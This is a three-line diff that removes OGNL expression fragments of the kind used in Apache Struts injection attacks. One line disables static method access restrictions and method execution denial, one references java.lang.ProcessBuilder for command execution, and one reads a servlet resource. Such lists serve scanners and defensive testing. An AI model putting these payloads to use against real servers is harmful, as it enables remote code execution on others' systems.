@@ -1,3 +1,0 @@
-%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().getResourceAsStream("~/test.txt")}
-%{@java.lang.ProcessBuilder}
-%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,java.lang.ThreadLocal@remove()}
